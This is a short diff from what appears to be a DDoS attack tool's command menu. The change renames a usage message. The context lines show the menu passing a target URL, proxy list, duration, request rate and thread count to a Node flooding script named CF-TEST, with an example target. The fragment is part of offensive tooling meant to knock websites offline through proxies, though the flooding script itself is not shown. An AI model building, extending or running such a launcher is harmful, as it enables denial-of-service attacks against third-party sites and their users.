@@ -104,7 +104,7 @@ This DDoS Tols is Weak --> Yasuo
                 threads = cnc.split()[6]
                 os.system(f'node methods/CF-TEST/CF-TEST.js {method} {url} {proxylist} {time} {req_per_ip} {threads}')
             except IndexError:
-                print('Usage: http-requests [Method] [Target] [Proxy List] [Time] [Requests Per IP] [Threads]')
+                print('Usage: CF-TEST [Method] [Target] [Proxy List] [Time] [Requests Per IP] [Threads]')
                 print('Example: GET https://tls.mrrage.xyz/nginx_status proxy.txt 50 124 5')
                 
         elif "TLS" in cnc:
